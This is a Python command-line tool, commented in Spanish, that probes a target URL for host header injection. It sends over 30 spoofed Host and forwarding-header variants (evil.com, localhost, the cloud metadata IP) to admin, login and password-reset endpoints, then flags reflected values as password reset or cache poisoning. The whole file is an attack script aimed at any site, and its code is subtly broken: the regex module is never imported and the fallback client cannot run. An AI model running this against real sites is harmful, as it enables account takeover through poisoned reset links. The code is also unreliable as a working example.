#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
HOST HEADER v2.0 - TANQUE EDITION
Host header attacks · Password reset poisoning · Cache poisoning
Con 30+ técnicas de bypass
"""

import asyncio
import random
from urllib.parse import urlparse
from typing import Dict, List, Optional

try:
    from http_client import HTTPClient
except ImportError:
    class HTTPClient:
        async def __aenter__(self): return self
        async def __aexit__(self, *args): pass
        async def get(self, url, headers=None): return None

class HostHeader:
    def __init__(self, url: str, aggressive: bool = False):
        self.url = url.rstrip('/')
        self.parsed = urlparse(url)
        self.domain = self.parsed.netloc
        self.scheme = self.parsed.scheme
        self.aggressive = aggressive
        self.client = None
        self.findings = []
        
        # Headers de prueba
        self.test_headers = [
            # Host básico
            ({'Host': 'evil.com'}, 'evil_host'),
            ({'Host': f'evil.com:{self.parsed.port or 80}'}, 'evil_host_port'),
            
            # X-Forwarded-Host
            ({'X-Forwarded-Host': 'evil.com'}, 'x_forwarded_host'),
            ({'X-Forwarded-Host': f'evil.com:{self.parsed.port or 80}'}, 'x_forwarded_port'),
            
            # Combinaciones
            ({'Host': self.domain, 'X-Forwarded-Host': 'evil.com'}, 'both_headers'),
            ({'Host': 'evil.com', 'X-Forwarded-Host': self.domain}, 'swapped'),
            
            # X-Host
            ({'X-Host': 'evil.com'}, 'x_host'),
            
            # X-Forwarded-Server
            ({'X-Forwarded-Server': 'evil.com'}, 'x_forwarded_server'),
            
            # Forwarded
            ({'Forwarded': 'host=evil.com'}, 'forwarded'),
            ({'Forwarded': f'host={self.domain};proto=https'}, 'forwarded_complex'),
            
            # X-Original-Host
            ({'X-Original-Host': 'evil.com'}, 'x_original_host'),
            
            # X-Rewrite-URL
            ({'X-Rewrite-URL': 'https://evil.com'}, 'x_rewrite'),
            
            # X-Original-URL
            ({'X-Original-URL': 'https://evil.com'}, 'x_original_url'),
            
            # Subdominios
            ({'Host': f'evil.{self.domain}'}, 'evil_subdomain'),
            ({'Host': f'{self.domain}.evil.com'}, 'domain_subdomain'),
            
            # Con credenciales
            ({'Host': 'evil.com@' + self.domain}, 'credentials'),
            ({'Host': self.domain + '@evil.com'}, 'credentials_rev'),
            
            # Con path
            ({'Host': 'evil.com/path'}, 'host_with_path'),
            ({'Host': f'{self.domain}/../evil.com'}, 'path_traversal'),
            
            # Codificados
            ({'Host': 'evil%2Ecom'}, 'encoded_dot'),
            ({'Host': 'evil.com%00'}, 'null_byte'),
            
            # Con puerto
            ({'Host': f'{self.domain}:{random.randint(1, 65535)}'}, 'random_port'),
            ({'Host': 'evil.com:80'}, 'evil_port_80'),
            ({'Host': 'evil.com:443'}, 'evil_port_443'),
            
            # IPs
            ({'Host': '127.0.0.1'}, 'localhost_ip'),
            ({'Host': 'localhost'}, 'localhost'),
            ({'Host': '0.0.0.0'}, 'zero_ip'),
            ({'Host': '169.254.169.254'}, 'metadata_ip'),
            
            # Múltiples
            ({'Host': 'evil.com, ' + self.domain}, 'multiple_comma'),
            ({'Host': self.domain + ' evil.com'}, 'multiple_space'),
            ({'Host': 'evil.com; ' + self.domain}, 'multiple_semicolon'),
            
            # Caracteres especiales
            ({'Host': 'evil.com#' + self.domain}, 'fragment'),
            ({'Host': 'evil.com?' + self.domain}, 'query'),
        ]
        
        # Endpoints sensibles
        self.sensitive_paths = [
            '/', '/admin', '/login', '/reset-password', '/forgot-password',
            '/api', '/api/user', '/user/reset', '/password/reset',
            '/.well-known', '/.well-known/change-password', '/auth',
        ]
        
        # Patrones de éxito
        self.success_patterns = [
            (r'evil\.com', 'host_in_response'),
            (r'127\.0\.0\.1', 'localhost_in_response'),
            (r'password reset', 'reset_in_response'),
            (r'reset link.*?evil', 'reset_poisoning'),
        ]
        
    async def setup(self):
        """Inicializa cliente HTTP"""
        self.client = HTTPClient(timeout=10, max_retries=2)
        
    def check_response(self, text: str, headers: Dict) -> List[str]:
        """Verifica si hay inyección exitosa"""
        indicators = []
        
        for pattern, name in self.success_patterns:
            if re.search(pattern, text, re.IGNORECASE):
                indicators.append(name)
                
        # Verificar en headers
        for header, value in headers.items():
            if 'evil.com' in value:
                indicators.append(f'header_{header}')
                
        return indicators
        
    async def test_host(self, path: str, headers: Dict, name: str) -> Optional[Dict]:
        """Prueba una combinación de headers"""
        url = f"{self.scheme}://{self.domain}{path}"
        
        try:
            resp = await self.client.get(url, headers=headers)
            
            if not resp:
                return None
                
            text = await resp.text()
            indicators = self.check_response(text, resp.headers)
            
            if indicators:
                return {
                    'type': 'HOST_HEADER_ATTACK',
                    'path': path,
                    'headers': name,
                    'url': url,
                    'status': resp.status,
                    'indicators': indicators,
                    'severity': 'CRITICO' if 'reset' in str(indicators) else 'ALTO'
                }
                
        except Exception as e:
            pass
        return None
        
    async def scan(self):
        """Ejecuta escaneo de host header"""
        print(f"\n[WEB] HOST HEADER v2.0 TANQUE - {self.url}")
        print("=" * 70)
        
        await self.setup()
        
        try:
            print(f"[*] Probando {len(self.test_headers)} variantes de Host header")
            print(f"[*] En {len(self.sensitive_paths)} endpoints")
            print("-" * 70)
            
            for path in self.sensitive_paths:
                print(f"\n[*] Probando: {path}")
                
                for headers, name in self.test_headers:
                    result = await self.test_host(path, headers, name)
                    
                    if result:
                        self.findings.append(result)
                        print(f"   [[CRITICO]] {name}")
                        print(f"        ↳ Indicadores: {', '.join(result['indicators'])}")
                        
                    await asyncio.sleep(random.uniform(0.1, 0.3))
                    
            # Resumen
            print("\n" + "="*70)
            print("📊 RESULTADOS HOST HEADER")
            print("="*70)
            
            if self.findings:
                reset_poisoning = [f for f in self.findings if 'reset' in str(f['indicators'])]
                
                if reset_poisoning:
                    print(f"\n[CRITICO] RESET POISONING: {len(reset_poisoning)}")
                    
                print(f"\n[WARN]  VULNERABILIDADES: {len(self.findings)}")
                for f in self.findings[:10]:
                    print(f"   • {f['path']} - {f['headers']}")
                    
                # Guardar resultados
                with open(f"host_header_{self.domain}.txt", 'w') as f:
                    for finding in self.findings:
                        f.write(f"{finding['url']} [{finding['headers']}]\n")
                print(f"\n💾 Resultados guardados en host_header_{self.domain}.txt")
            else:
                print("\n[OK] No se detectaron vulnerabilidades de Host header")
                
        finally:
            if self.client:
                await self.client.close()
                
        return self.findings

async def main():
    import sys
    if len(sys.argv) < 2:
        print("Uso: python3 host_header.py <URL> [--aggressive]")
        sys.exit(1)
        
    url = sys.argv[1]
    aggressive = '--aggressive' in sys.argv
    
    scanner = HostHeader(url, aggressive)
    await scanner.scan()

if __name__ == "__main__":
    asyncio.run(main())
